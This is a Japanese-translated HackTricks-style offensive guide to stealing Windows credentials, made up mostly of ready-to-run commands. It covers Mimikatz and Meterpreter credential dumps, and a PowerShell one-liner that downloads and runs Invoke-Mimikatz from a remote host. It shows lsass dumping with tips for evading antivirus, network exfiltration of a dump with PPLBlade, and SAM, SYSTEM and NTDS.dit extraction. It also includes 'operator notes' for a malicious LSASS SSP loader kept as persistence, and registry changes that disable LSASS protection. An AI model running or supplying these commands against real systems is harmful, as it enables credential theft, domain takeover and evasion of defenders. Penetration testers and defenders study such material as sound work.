# Windows Credentials の窃取

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatzができる他のことは** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **この保護は Mimikatz が一部の credentials を抽出するのを防ぐ可能性があります。**

## Meterpreter を使った Credentials

[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **私が作成した** を使用して、被害者のシステム内の **passwords and hashes を検索** してください。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVの回避

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規の Microsoft ツールです**。そのため Defender に検出されません。\
このツールを使えば、**dump the lsass process**、**download the dump**、およびダンプから**extract**して**credentials locally**を取り出せます。  

また [SharpDump](https://github.com/GhostPack/SharpDump) を使うこともできます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) で自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は **procdump.exe を使って lsass.exe をダンプする行為** を **悪意あるものとして検出** する場合があります。これは **"procdump.exe" と "lsass.exe"** という文字列を検出しているためです。したがって、lsass.exe という名前を渡す代わりに、lsass.exe の **PID** を procdump に **引数** として渡す方が **ステルス性** が高くなります。

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32` に存在する **comsvcs.dll** という DLL は、クラッシュ時に **プロセスメモリをダンプ** する役割を担っています。この DLL には `MiniDumpW` という **関数** が含まれており、`rundll32.exe` を使って呼び出すように設計されています。\
最初の2つの引数は重要ではありませんが、3番目の引数は3つの要素に分かれます。ダンプ対象のプロセス ID が1つ目、ダンプファイルの場所が2つ目、3つ目は厳密に単語 **full** です。代替オプションは存在しません。\
これら3つの要素を解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをそのファイルに書き込みます。\
**comsvcs.dll** を利用すれば lsass プロセスのダンプが可能で、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) に記載されています。

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは自動化できます** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **lsass を Task Manager でダンプする**

1. Task Bar を右クリックし、Task Manager をクリックします
2. More details をクリックします
3. Processes タブで "Local Security Authority Process" プロセスを検索します
4. "Local Security Authority Process" を右クリックし、"Create dump file" をクリックします.

### lsass を procdump でダンプする

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade での lsass ダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、ディスクに落とすことなくリモートワークステーションへ転送しつつ、memory dump を難読化することをサポートする Protected Process Dumper Tool です。

**主な機能**:

1. PPL protection をバイパスする
2. Defender のシグネチャベースの検出機構を回避するために memory dump ファイルを難読化する
3. RAW と SMB のアップロード方式で memory dump をディスクに落とさずにアップロードする（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump

Ink Dragon は **LalsDumper** と呼ばれる3段階のダンパーを配布しており、`MiniDumpWriteDump` を一切呼び出さないため、そのAPIに対する EDR フックは発火しません:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` を検索し、32文字の小文字の `d` からなるプレースホルダを探して、それを `rtu.txt` への絶対パスで上書きし、パッチ済みの DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより **LSASS** は悪意のある DLL を新しい Security Support Provider (SSP) として読み込みます。
2. **Stage 2 inside LSASS** – LSASS が `nfdp.dll` を読み込むと、DLL は `rtu.txt` を読み取り、各バイトを `0x20` で XOR し、デコードされたブロブをメモリにマップしてから実行を移します。
3. **Stage 3 dumper** – マップされたペイロードはハッシュ化された API 名から解決した **direct syscalls** を使って MiniDump ロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。`Tom` という専用のエクスポートは `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS ダンプをファイルにストリームし、ハンドルを閉じて後で exfiltration できるようにします。

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, および `rtu.txt` を同じディレクトリに置いてください。Stage 1 はハードコードされたプレースホルダを `rtu.txt` の絶対パスで書き換えるため、これらを分割するとチェーンが切れます。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追加することで行われます。この値を自分で設定すれば、LSASS が毎回のブートで SSP を再読み込みします。
* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで解凍してから Mimikatz/Volatility に渡してクレデンシャル抽出を行ってください。
* `lals.exe` を実行するには admin/SeTcb 権限が必要で、そうして初めて `AddSecurityPackageA` が成功します。呼び出しが返ると、LSASS は透過的に不正な SSP を読み込み Stage 2 を実行します。
* ディスクから DLL を削除しても LSASS から追い出されることはありません。レジストリエントリを削除して LSASS を再起動する（再起動）か、長期的な persistence として残しておいてください。

## CrackMapExec

### SAM ハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA シークレットをダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲット DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### NTDS.dit の各アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

これらのファイルは _C:\windows\system32\config\SAM_ および _C:\windows\system32\config\SYSTEM_ に**配置されている**べきです。しかし、**通常の方法で単にコピーすることはできません**。保護されているためです。

### レジストリから

これらのファイルを入手する最も簡単な方法は、レジストリからコピーを取得することです:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
それらのファイルをKaliマシンに**Download**し、**extract the hashes**するには次を使用します:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

このサービスを使うことで保護されたファイルのコピーを実行できます。管理者権限が必要です。

#### vssadmin を使用する

vssadmin バイナリは Windows Server のバージョンでのみ利用可能です
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
しかし、**Powershell** でも同じことができます。これは **how to copy the SAM file** の例です（使用しているハードドライブは "C:"、保存先は C:\users\Public です）。これは任意の保護されたファイルをコピーするためにも使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍からのコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 認証情報 - NTDS.dit**

The **NTDS.dit** file は **Active Directory** の中核として知られており、ユーザーオブジェクト、グループ、およびそれらのメンバーシップに関する重要なデータを保持します。ドメインユーザーの **password hashes** が格納されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースで、**_%SystemRoom%/NTDS/ntds.dit_** に配置されています。

このデータベース内には主に3つのテーブルが保持されています:

- **Data Table**: このテーブルはユーザーやグループのようなオブジェクトに関する詳細を格納します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** がここに保存され、格納オブジェクトのセキュリティとアクセス制御を担保します。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows はこのファイルとやり取りするために _Ntdsa.dll_ を使用し、_lsass.exe_ によって利用されます。したがって、**NTDS.dit** ファイルの**part** が `lsass` メモリ内に存在することがあり（パフォーマンス向上のための**cache** を使用しているため、おそらく最近アクセスされたデータを見つけられます）。

#### NTDS.dit 内のハッシュの復号

ハッシュは3重に暗号化されています:

1. Password Encryption Key (**PEK**) を **BOOTKEY** と **RC4** を使って復号します。
2. **PEK** を使い **RC4** で **hash** を復号します。
3. **DES** を使って **hash** を復号します。

**PEK** はすべてのドメインコントローラで同じ値を持ちますが、**NTDS.dit** ファイル内ではドメインコントローラの **SYSTEM** ファイルの **BOOTKEY** を使って暗号化されています（ドメインコントローラごとに異なります）。このため、NTDS.dit ファイルから資格情報を取得するには **NTDS.dit と SYSTEM** のファイルが必要です (_C:\Windows\System32\config\SYSTEM_)。

### Ntdsutil を使用して NTDS.dit をコピーする方法

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
また、[**volume shadow copy**](#stealing-sam-and-system)トリックを使って**ntds.dit**ファイルをコピーすることもできます。**SYSTEM file**のコピーも必要になることを忘れないでください（再度、[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)トリック）。

### **NTDS.dit からハッシュを抽出する**

ファイル**NTDS.dit**と**SYSTEM**を**取得したら**、_secretsdump.py_などのツールを使用して**ハッシュを抽出する**ことができます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効な domain admin ユーザーを使用して、**自動的に抽出することもできます**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
大きな **NTDS.dit ファイル** の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` を使用することもできます。

### **NTDS.dit から SQLite データベースへのドメインオブジェクトの抽出**

NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。機密情報だけでなく、生の NTDS.dit ファイルを既に取得している場合には、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive はオプションですが、secrets decryption（NT & LM hashes、supplemental credentials such as cleartext passwords、kerberos or trust keys、NT & LM password histories）を可能にします。その他の情報とともに、以下のデータが抽出されます：user and machine accounts with their hashes、UAC flags、timestamp for last logon and password change、accounts description、names、UPN、SPN、groups and recursive memberships、organizational units tree and membership、trusted domains with trusts type、direction and attributes...

## Lazagne

バイナリは [here](https://github.com/AlessandroZ/LaZagne/releases) からダウンロードしてください。このバイナリを使用して、複数のソフトウェアから credentials を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から認証情報を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから認証情報を抽出するために使用できます。ダウンロード先: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM ファイルから認証情報を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから資格情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ダウンロード: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) から入手し、単に **実行** するだけでパスワードが抽出されます。

## Mining idle RDP sessions and weakening security controls

Ink Dragon の FinalDraft RAT には `DumpRDPHistory` タスクが含まれており、その手法はあらゆる red-teamer にとって有用です:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – 各ユーザーのハイブを `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` で解析します。各サブキーにはサーバー名、`UsernameHint`、および最終書き込みタイムスタンプが保存されます。FinalDraft のロジックは次の PowerShell で再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログをクエリし、Event ID **21**（成功したログオン）および **25**（切断）を調べて、誰がそのホストを管理していたかをマッピングします:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかが分かったら、その管理者の **切断済み** セッションがまだ存在しているうちに LSASS をダンプします（LalsDumper/Mimikatz を使用）。CredSSP + NTLM のフォールバックにより、その検証情報やトークンが LSASS に残り、それを SMB/WinRM 経由でリプレイして `NTDS.dit` を取得したり、ドメインコントローラ上で永続化を仕込んだりできます。

### Registry downgrades targeted by FinalDraft

同じ implant は、credential theft を容易にするためにいくつかのレジストリキーを改変します:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP 時に資格情報/チケットの完全な再利用が強制され、pass-the-hash スタイルのピボットが可能になります。
* `LocalAccountTokenFilterPolicy=1` は UAC のトークンフィルタリングを無効にし、ローカル管理者がネットワーク経由で制限のないトークンを取得できるようにします。
* `DSRMAdminLogonBehavior=2` は DC がオンラインの間でも DSRM 管理者がログオンできるようにし、攻撃者に別の組み込み高権限アカウントを提供します。
* `RunAsPPL=0` は LSASS PPL 保護を削除し、LalsDumper のようなダンプツールによるメモリアクセスを容易にします。

## 参考文献

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
